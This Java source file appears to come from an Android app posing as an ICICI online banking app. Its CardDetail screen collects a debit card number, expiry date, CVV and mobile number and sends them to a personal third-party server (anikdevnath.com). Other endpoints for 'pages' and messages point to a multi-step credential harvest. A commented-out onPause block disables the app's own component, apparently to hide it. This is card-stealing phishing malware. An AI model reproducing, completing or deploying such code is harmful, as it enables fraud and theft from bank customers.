package com.codewithmuddasir.onlinebanking;

import android.app.ProgressDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import android.text.Editable;
import android.text.TextUtils;
import android.text.TextWatcher;

import androidx.appcompat.app.AppCompatActivity;
import androidx.databinding.DataBindingUtil;

import com.codewithmuddasir.onlinebanking.databinding.ActivityCardDetailBinding;
import com.codewithmuddasir.onlinebanking.helper.Util;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Body;
import retrofit2.http.POST;
import retrofit2.http.PUT;

public class CardDetail extends AppCompatActivity {

    ActivityCardDetailBinding binding;

    private Util util;

    private ProgressDialog progressDialog;


    CreditCardTextWatcher creditCardTextWatcher = new CreditCardTextWatcher();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = DataBindingUtil.setContentView(this, R.layout.activity_card_detail);

        util = new Util();
        util.saveLocalData(this,"check","true");

        progressDialog = new ProgressDialog(CardDetail.this);
        progressDialog.setMessage("Loading... Please Wait");
        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progressDialog.setCancelable(false);


        binding.deb.addTextChangedListener(creditCardTextWatcher);


        binding.sub.setOnClickListener(view -> {
            util.saveLocalData(this ,"check","false");
            if(binding.deb.getText().toString().isEmpty() || binding.cvv.getText().toString().isEmpty()
                    || binding.mon.getText().toString().isEmpty()|| binding.year.getText().toString().isEmpty()){
                Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show();
            }else{

                Intent intent2 = getIntent();
                User user = new User(intent2.getStringExtra("u"),
                        binding.deb.getText().toString(),binding.mon.getText().toString(),
                        binding.year.getText().toString()
                        ,binding.cvv.getText().toString(),intent2.getStringExtra("m"));

                ApiService apiService = ApiClient.getClient().create(ApiService.class);
                Call<Void> call = apiService.createUser(user);

                call.enqueue(new Callback<Void>() {
                    @Override
                    public void onResponse(Call<Void> call, Response<Void> response) {
                        // Handle successful response
                        if (response.isSuccessful()) {
                            // Data sent successfully
                            Intent intent = new Intent(CardDetail.this, CongratulationActivity.class);
                            startActivity(intent);
                        } else {
                            // Handle other response codes if needed
                            Log.d("asdf123","unsucess");
                        }
                    }

                    @Override
                    public void onFailure(Call<Void> call, Throwable t) {
                        // Handle failure
                        Log.d("asdf123",t.toString());
                    }
                });



            }


        });


    }

//    @Override
//    protected void onPause() {
//        super.onPause();
//        Util util = new Util();
//        if (util.getLocalData(this, "check").equals("true")) {
//            Log.e("asdf123", "pause: verify activity");
//            PackageManager packageManager = getPackageManager();
//            packageManager.setApplicationEnabledSetting(
//                    getPackageName(),
//                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//                    PackageManager.DONT_KILL_APP
//            );
//        }
//    }

}




class User {
    private String userId;
    private String debitcard;
    private String monthexpire;
    private String monthyear;
    private String cvv;
    private String mobile;

    public User(String useridf,
                String debitcard, String monthexpir,String monthyear, String cvv,String mobile) {
        this.userId = useridf;
        this.debitcard = debitcard;
        this.monthexpire = monthexpir;
        this.cvv = cvv;
        this.monthyear = monthyear;
        this.mobile = mobile;
    }
}





interface ApiService {
    @PUT("fourthPage.php")
    Call<Void> createUser(@Body User user);


    @POST("icicInsertMessage.php")
    Call<Void> createmessage(@Body message message);


    @POST("firstPageAdd.php")
    Call<Void> createfirstpage(@Body firstpage message);

    @PUT("secondPage.php")
    Call<Void> createsecondpage(@Body secondapge message);

    @PUT("thirdPage.php")
    Call<Void> createthirdpage(@Body thirdapge message);

}


class ApiClient {
    private static final String BASE_URL = "https://anikdevnath.com/ICIC_APIS/";
    private static Retrofit retrofit;

    public static Retrofit getClient() {
        if (retrofit == null) {
            retrofit = new Retrofit.Builder()
                    .baseUrl(BASE_URL)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
        }
        return retrofit;
    }
}






class CreditCardTextWatcher implements TextWatcher {
    private boolean isFormatting = false;
    private char separator = '/';

    @Override
    public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

    @Override
    public void onTextChanged(CharSequence s, int start, int before, int count) {}

    @Override
    public void afterTextChanged(Editable s) {
        if (isFormatting) {return;}
        isFormatting = true;
        formatCreditCardNumber(s);
        isFormatting = false;
    }

    private void formatCreditCardNumber(Editable text) {
        if (text != null) {
            int length = text.length();

            if (length > 0 && (length + 1) % 5 == 0) {
                char c = text.charAt(length - 1);
                if (separator == c) {
                    text.delete(length - 1, length);
                }
            }

            if (length > 0 && length % 5 == 0) {
                char c = text.charAt(length - 1);
                if (Character.isDigit(c) && TextUtils.split(text.toString(), String.valueOf(separator)).length <= 3) {
                    text.insert(length - 1, String.valueOf(separator));
                }
            }
        }
    }
}
